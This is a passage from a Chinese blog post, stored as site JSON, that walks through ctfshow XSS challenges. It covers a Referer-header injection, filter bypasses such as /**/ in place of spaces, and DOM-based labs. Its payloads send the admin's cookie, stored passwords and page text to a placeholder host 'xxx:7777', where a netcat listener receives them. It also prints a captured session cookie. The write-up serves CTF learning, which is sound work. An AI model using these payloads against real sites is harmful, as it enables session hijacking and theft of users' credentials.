class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p>发现双引号被转换为HTML实体，这个也没戏，这个也G，此时我查看过其他师傅的wp后，得知这里的<code>t_ref</code>参数是用Referer传值的，没有解释具体的原因，博主也只是小白,这个思路非要理的话也只能说是从ref这个想，或者抓包看有没有Referer头，Referer是告诉服务器你是从哪里来的，比如你在google中点击baidu.com这个链接，Referer头就是<code>https://google.com</code>，这里我们先进行测试一下，传个Referer值<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534297.png\" alt=\"在这里插入图片描述\"><br>看源代码<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534837.png\" alt=\"在这里插入图片描述\"><br>因此找到新的注入点，我们构造语句来闭合value，同之前相似，构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token string double-quoted-string\">\" type=\"</span>password\" onclick<span class=\"token operator\">=</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534832.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"空格绕过\"><a href=\"#空格绕过\" class=\"headerlink\" title=\"空格绕过\"></a>空格绕过</h2><p>题目</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>圣诞快乐，写下祝福语，生成链接，发送给朋友，可以领取十个鸡蛋！</p></blockquote>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534895.png\" alt=\"在这里插入图片描述\"><br>经过测试<code>script</code>被过滤<br>此时我们用iframe标签来进行攻击</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>iframe onload<span class=\"token operator\">=</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>iframe<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>发现弹不出来，这里有空格，所以首先考虑一下是否空格被ban，我们这里用<code>/**/</code>来代替空格</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>iframe<span class=\"token comment\">/**/</span>onload<span class=\"token operator\">=</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>iframe<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>iframe<span class=\"token comment\">/**/</span>onload<span class=\"token operator\">=</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span>document<span class=\"token operator\">.</span>cookie<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>iframe<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534899.png\" alt=\"在这里插入图片描述\"><br>确实可以。<br>flag藏于cookie中，我们需要想办法获取管理员的cookie，肯定不能<code>&lt;iframe/**/onload=alert(document.cookie);&gt;&lt;/iframe&gt; </code>，因为这样的话得到的是自己的cookie，需要的是管理员的cookie，这时候有个方法就是我们利用我们的vps，用nc端口监听，然后直接我们在搜索框中添加一个js跳转链接加上获取cookie的代码，这时候管理员就会访问我们的ip地址，我们也就拿到了管理员cookie，也就得到了flag，思路有了，那payload构造也并非难事<br>先在vps开启监听</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">nc <span class=\"token operator\">-</span>lvnp <span class=\"token number\">7777</span>\n<span class=\"token comment\">//虽然只能接收一次，但我们可以nc多次</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>payload有以下几种</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>body<span class=\"token comment\">/**/</span>onload<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"window.open('http://xxx:7777/'+document.cookie)\"</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>body<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>svg<span class=\"token comment\">/**/</span>onload<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"window.open('http://xxx:7777/'+document.cookie)\"</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>svg<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>input<span class=\"token comment\">/**/</span>onfocus<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"window.open('http://xxx:7777/'+document.cookie)\"</span> autofocus<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>input<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>iframe<span class=\"token comment\">/**/</span>onload<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"window.open('http://xxx:7777/'+document.cookie)\"</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>iframe<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534875.png\" alt=\"在这里插入图片描述\"><br>此时就得到了管理员cookie，解题完成</p>\n<h2 id=\"DOM型实战\"><a href=\"#DOM型实战\" class=\"headerlink\" title=\"DOM型实战\"></a>DOM型实战</h2><h3 id=\"0X01-2\"><a href=\"#0X01-2\" class=\"headerlink\" title=\"0X01\"></a>0X01</h3><p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534822.png\" alt=\"在这里插入图片描述\"><br>发现有注册的，先随便注册一下，然后登录<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534850.png\" alt=\"在这里插入图片描述\"><br>只有管理员可以查看，这里的话我们的思路就是获取当前管理员的cookie，但是要从哪里着手呢，此时查看用户名和密码的源代码<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534900.png\" alt=\"在这里插入图片描述\"><br>可以发现这两个都是不存在单引号或者双引号包裹的，因此我们可以直接插入一段js代码，借助vps调出管理员的cookie，而后修改我们的cookie为管理员的cookie，此时我们的身份就变成了管理员的，因此我们这里去再注册一个，账号注册如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>iframe onload<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"window.open('http://xxx:7777/'+document.cookie)\"</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>iframe<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>script<span class=\"token operator\">></span>window<span class=\"token operator\">.</span>location<span class=\"token operator\">.</span>href<span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'http://xxx:7777/'</span><span class=\"token operator\">+</span>document<span class=\"token operator\">.</span>cookie<span class=\"token punctuation\">;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>密码随便写（当然，账号随便写，密码写成这个也可以）<br>在你的vps开启监听端口</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">nc <span class=\"token operator\">-</span>lvnp <span class=\"token number\">7777</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>登录后点击用户管理，此时再看vps<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534368.png\" alt=\"在这里插入图片描述\"><br>得到管理员cookie<code>ruenb618p3e7tg5a6gtumcs89b </code><br>修改cookie值，刷新界面<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534147.png\" alt=\"在这里插入图片描述\"><br>得到flag<code>ctfshow&#123;d5cdea15-ce33-4df2-b9f0-13aab7b94fa1&#125;</code></p>\n<h3 id=\"0X02-2\"><a href=\"#0X02-2\" class=\"headerlink\" title=\"0X02\"></a>0X02</h3><p>直接利用vps获取cookie，但是此时cookie一直是无效的，可能是管理员访问后立马登出，导致了cookie失效，我们这里获取的话可以去获取它的用户名和密码界面<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534126.png\" alt=\"在这里插入图片描述\"><br>可以看见这个密码的话是在<code>layui-table-cell laytable-cell-1-0-1</code>类中的，因此我们需要用<code>getElementsByClassName</code>来获取，<code>getElementsByClassName</code>的作用是获取所有指定类名的元素<br>在控制台中<code>document.getElementsByClassName(&#39;layui-table-cell laytable-cell-1-0-1&#39;)</code>可以发现<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534134.png\" alt=\"在这里插入图片描述\"><br>密码在innerHTML中，此时再试着将这个输出<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534114.png\" alt=\"在这里插入图片描述\"><br>这时候就得到了密码，那我们此时利用这个即可构造得到flag的语句，如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>script<span class=\"token operator\">></span>window<span class=\"token operator\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'http://xxx:7777/'</span><span class=\"token operator\">+</span>document<span class=\"token operator\">.</span><span class=\"token function\">getElementsByClassName</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'layui-table-cell laytable-cell-1-0-1'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span>innerHTML<span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534289.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"0X03\"><a href=\"#0X03\" class=\"headerlink\" title=\"0X03\"></a>0X03</h3><p>发现此时多了一个修改密码的界面，我们在修改密码界面打开控制台<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534443.png\" alt=\"在这里插入图片描述\"><br>在这里可以看见<code>layui-container</code>类包含了整个界面，因此类就确定为<code>layui-container</code>，此时我们用<br><code>querySelector</code>方法，<code>querySelector()</code> 方法返回文档中匹配指定 CSS 选择器的一个元素。，在这里的话我们就将这个界面的文本进行输出，因此构造payload如下即可</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>script<span class=\"token operator\">></span>window<span class=\"token operator\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'http://xxx:7777/'</span><span class=\"token operator\">+</span>document<span class=\"token operator\">.</span><span class=\"token function\">querySelector</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'#top > div.layui-container'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span>textContent<span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h1 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h1><p>《从0到1:CTFer成长之路》<br><a href=\"https://www.cnblogs.com/hookjoy/p/3538487.html\">https://www.cnblogs.com/hookjoy/p/3538487.html</a><br><a href=\"https://blog.csdn.net/LYJ20010728/article/details/116462782\">https://blog.csdn.net/LYJ20010728/article/details/116462782</a><br><a href=\"https://wizardforcel.gitbooks.io/xss-naxienian/content/2.html\">https://wizardforcel.gitbooks.io/xss-naxienian/content/2.html</a><br><a href=\"https://blog.csdn.net/qq_42383069/article/details/123419621\">https://blog.csdn.net/qq_42383069/article/details/123419621</a><br><a href=\"https://www.cnblogs.com/csnd/p/11807592.html\">https://www.cnblogs.com/csnd/p/11807592.html</a><br><a href=\"https://www.freebuf.com/articles/web/334662.html\">https://www.freebuf.com/articles/web/334662.html</a><br><a href=\"https://www.freebuf.com/articles/web/276998.html\">https://www.freebuf.com/articles/web/276998.html</a><br><a href=\"https://www.cnblogs.com/sfsec/p/15178028.html\">https://www.cnblogs.com/sfsec/p/15178028.html</a></p>\n","feature":true,"text":"前言之前在XSS方面只有很浅的了解，再次学习过后，这里对其部分知识进行总结，同时用例题来讲解，希望能对在学习XSS的师傅有所帮助 什么是XSSXSS，全拼Cross Site Scripting，中文含义是跨站脚本攻击，为了不和层叠样式表(Cascading Style Shee...","link":"","photos":[],"count_time":{"symbolsCount":"12k","symbolsTime":"11 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"XSS","slug":"XSS","count":2,"path":"api/tags/XSS.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%BB%80%E4%B9%88%E6%98%AFXSS\"><span class=\"toc-text\">什么是XSS</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">漏洞原理</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3\"><span class=\"toc-text\">漏洞危害</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB\"><span class=\"toc-text\">漏洞分类</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS\"><span class=\"toc-text\">反射型XSS</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%AD%98%E5%82%A8%E5%9E%8BXSS\"><span class=\"toc-text\">存储型XSS</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#DOM%E5%9E%8B\"><span class=\"toc-text\">DOM型</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%94%BB%E5%87%BB%E5%B8%B8%E7%94%A8%E6%A0%87%E7%AD%BE\"><span class=\"toc-text\">攻击常用标签</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#script%E6%A0%87%E7%AD%BE\"><span class=\"toc-text\">script标签</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#img%E6%A0%87%E7%AD%BE\"><span class=\"toc-text\">img标签</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#a%E6%A0%87%E7%AD%BE\"><span class=\"toc-text\">a标签</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#input%E6%A0%87%E7%AD%BE\"><span class=\"toc-text\">input标签</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#body%E6%A0%87%E7%AD%BE\"><span class=\"toc-text\">body标签</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#svg%E6%A0%87%E7%AD%BE\"><span class=\"toc-text\">svg标签</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#iframe%E6%A0%87%E7%AD%BE\"><span class=\"toc-text\">iframe标签</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%B8%B8%E7%94%A8%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF\"><span class=\"toc-text\">常用绕过姿势</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8F%8C%E5%86%99%E5%8F%8A%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">双写及大小写绕过</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%AE%9E%E4%BD%93%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88%E8%BE%93%E5%87%BA%E5%9C%A8%E6%A0%87%E7%AD%BE%E5%B1%9E%E6%80%A7%E4%B8%AD%EF%BC%89\"><span class=\"toc-text\">实体编码绕过（输出在标签属性中）</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%97%AD%E5%90%88%E8%AF%AD%E5%8F%A5%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">闭合语句绕过</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC\"><span class=\"toc-text\">绕过空格</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E7%BB%95WAF\"><span class=\"toc-text\">绕WAF</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%A7%BF%E5%8A%BF\"><span class=\"toc-text\">姿势</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#iframe%E6%A0%87%E7%AD%BE-1\"><span class=\"toc-text\">iframe标签</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#audio%E6%A0%87%E7%AD%BE\"><span class=\"toc-text\">audio标签</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#video%E6%A0%87%E7%AD%BE\"><span class=\"toc-text\">video标签</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#svg%E6%A0%87%E7%AD%BE-1\"><span class=\"toc-text\">svg标签</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#button%E6%A0%87%E7%AD%BE\"><span class=\"toc-text\">button标签</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#object%E6%A0%87%E7%AD%BE\"><span class=\"toc-text\">object标签</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#div%E6%A0%87%E7%AD%BE\"><span class=\"toc-text\">div标签</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%AE%9E%E6%88%98\"><span class=\"toc-text\">实战</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8F%8C%E5%86%99%E5%8F%8A%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87-1\"><span class=\"toc-text\">双写及大小写绕过</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X01\"><span class=\"toc-text\">0X01</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X02\"><span class=\"toc-text\">0X02</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%AE%9E%E4%BD%93%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">实体编码绕过</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%97%AD%E5%90%88%E8%AF%AD%E5%8F%A5%E7%BB%95%E8%BF%87-1\"><span class=\"toc-text\">闭合语句绕过</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X01-1\"><span class=\"toc-text\">0X01</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X02-1\"><span class=\"toc-text\">0X02</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">空格绕过</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#DOM%E5%9E%8B%E5%AE%9E%E6%88%98\"><span class=\"toc-text\">DOM型实战</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X01-2\"><span class=\"toc-text\">0X01</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X02-2\"><span class=\"toc-text\">0X02</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0X03\"><span class=\"toc-text\">0X03</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE\"><span class=\"toc-text\">参考文献</span></a></li></ol>","author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"XSS常见绕过姿势和绕某狗WAF所用标签小记","uid":"ff5ef1580e1509b5812626f28a444a2d","slug":"XSS.haozi.me刷题","date":"2022-07-11T10:32:20.000Z","updated":"2024-02-14T08:02:06.000Z","comments":true,"path":"api/articles/XSS.haozi.me刷题.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141602387.jpeg","text":"前言XSS学习过后，想刷一些题，github找到一个，链接如下https://xss.haozi.me/ 0X00function render (input) &#123; return '&lt;div>' + input + '&lt;/div>' &#125; 看到服务端...","link":"","photos":[],"count_time":{"symbolsCount":"7.7k","symbolsTime":"7 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"XSS","slug":"XSS","count":2,"path":"api/tags/XSS.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"小白的代码审计初始之路","uid":"bf43e15989ef186ce3f8420a1b97dea6","slug":"小白的代码审计之路","date":"2022-07-05T10:45:30.000Z","updated":"2024-02-14T07:48:04.000Z","comments":true,"path":"api/articles/小白的代码审计之路.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141526491.png","text":"声明文章首发于先知社区https://xz.aliyun.com/t/11553 代码审计概念什么是代码审计？ 代码审计是在一个编程中对源代码旨在发现错误、安全漏洞或违反编程约定的项目。说人话就是找它这些代码中可能存在问题的地方，然后看它是否真的存在漏洞。(博主小白，可能存在问题...","link":"","photos":[],"count_time":{"symbolsCount":"17k","symbolsTime":"15 mins."},"categories":[{"name":"代码审计","slug":"代码审计","count":7,"path":"api/categories/代码审计.json"}],"tags":[{"name":"代码审计","slug":"代码审计","count":6,"path":"api/tags/代码审计.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true}}